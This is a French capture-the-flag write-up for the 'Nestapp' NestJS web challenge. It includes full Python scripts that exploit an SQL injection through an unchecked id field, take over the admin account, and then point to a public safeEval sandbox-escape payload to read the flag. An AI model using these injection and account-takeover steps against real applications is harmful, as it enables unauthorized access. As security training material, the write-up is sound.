---
layout: default
type: writeup
title: Nestapp
category: Web
point: 328
files: ["Nestapp.zip"]
---

{% raw %}
> **title:** Nestapp
>
> **category:** Web
>
> **difficulty:** Hardcore
>
> **point:** 328
>
> **author:** Eteck#3426
>
> **description:**
>
> In order to create an API with an auth system, a developer used NestJS. He tried to follows the doc and all the good practices on the official NestJS website, and used libraries that seems safe.
> 
> But is it enough ? Your goal is to read the flag, located in /home/flag.txt
> 

## Solution

<br>

### Installation local

On a à notre disposition le code source de l'application. Commençons par installer les packages en local.

![Résultat de la commande 'npm install'](images/install.png)

On voit que des vulnerabilités sont détectées dans certains packages, récupérons plus de détails :

![Résultat de la commande 'npm audit'](images/audit.png)

Apparement **`safeEval`** est vulnérable, et si c'est exploitable c'est un moyen d'aller récupérer `/home/flag.txt`. Regardons donc comment cette fonction est utilisée :

![Recherche de safeEval dans le code](images/search.png)

**`safeEval`** est utilisé avec le body d'un `POST /exec` mais il faut avoir le pseudo `admin` pour cela.

Sauf qu'en regardant la définition de la table `users`, on voit que le pseudo est unique donc impossible de créer un compte avec le même pseudo :

![Définition de la table 'users'](images/usersTable.png)

<br>

### Injection SQL

En se baladant un peu plus dans le code, on aperçoit une injection SQL :

![Injection SQL](images/injection.png)

Cette méthode est appelée via la requête **`GET /infos`** :

![Recherche de l'utilisation de usersService.get dans le code](images/infos.png)

<br>

### Modification de l'ID

Ainsi en modifiant notre **`id`**, il est possible de réaliser l'injection. Ca tombe bien puisque la méthode **`register`**, pour créer un compte, ne fait aucune vérification sur le body qu'elle reçoit :

![Code de la fonction register pour créer un compte](images/register.png)

Et la base de données est directement mise à jour :

![Code de la fonction save pour mettre à jour la base de données](images/repositorySave.png)

On peut donc essayer forcer la valeur de **`id`** :

![Requête avec un ID personnalisé](images/customID.png)

![Requête avec un ID personnalisé](images/customIDDecoded.png)

Ca fonctionne !

<br>

### Récupération du compte admin

La stratégie est maintenant la suivante :

1. Récupérer l'**`id`** du compte **`admin`**
2. Créer un nouveau compte avec cet **`id`** pour écraser le pseudo et le mot de passe du compte **`admin`**
3. Créer un nouveau compte **`admin`** avec notre propre mot de passe puisque le pseudo sera à disponible

Il faut tout de même noter que le champ **`id`** est prévu pour un UUID, soit **36 caractères maximum pour faire passer notre injection**.


Passons en python pour faire cela :

<br>

#### Etape 1 : récupération de l'id

```python
from requests import get, post
from uuid import uuid4

URL = "http://13.37.17.31:54246"

token = post(f"{URL}/auth/register", data={
	"pseudo": str(uuid4()).replace('-', ''), # random 32 chars username
	"password": "password",
	"id": "' OR pseudo = 'admin"
}).json()['access_token']

response = get(f"{URL}/infos", headers={
	"Authorization": f"Bearer {token}"
}).json()
print(response)
```

```text
{'username': 'admin', 'id': '52ae92d7-30c7-46df-8ee4-693056e3b21a'}
```

<br>

#### Etape 2 : écrasement du compte

```python
from requests import post
from uuid import uuid4

URL = "http://13.37.17.31:54246"
ID = '52ae92d7-30c7-46df-8ee4-693056e3b21a'

status_code = post(f"{URL}/auth/register", data={
	"pseudo": str(uuid4()).replace('-', ''), # random 32 chars username
	"password": "password",
	"id": ID
}).status_code
print(status_code)
```

```
201
```

<br>

#### Etape 3 : création du nouveau compte admin

```python
from requests import post

URL = "http://13.37.17.31:54246"

token = post(f"{URL}/auth/register", data={
	"pseudo": "admin",
	"password": "password"
}).json()['access_token']
print(token)
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwc2V1ZG8iOiJhZG1pbiIsInN1YiI6ImUxOWRiNDUwLTU1NWEtNGM1ZC05YjZjLTBmMDljMzhkMzYxYSIsImlhdCI6MTY4MzcxNzMwNywiZXhwIjoxNjgzNzI0NTA3fQ.dZxjtCGKItMTM8u5nt-a93s5dG4ZqwLRODmSYNMdZDs
```

<br>

Et voilà, nous avons bien un token avec le pseudo 'admin' :

![Token du compte 'admin'](images/admin_token.png)

<br>

### Bypass safeEval et RCE

En cherchant les références données par npm, on tombe sur des payloads déjà prêts. Ici j'utilise **[celui-ci](https://github.com/hacksparrow/safe-eval/issues/27)** que j'ai un peu adapté :

![RCE et obtention du flag'](images/flag.png)

**`FLAG : PWNME{g0D_jOB!_S4Fe-ev41_w4S_N0t_WeRY_2Af3}`**

{% endraw %}
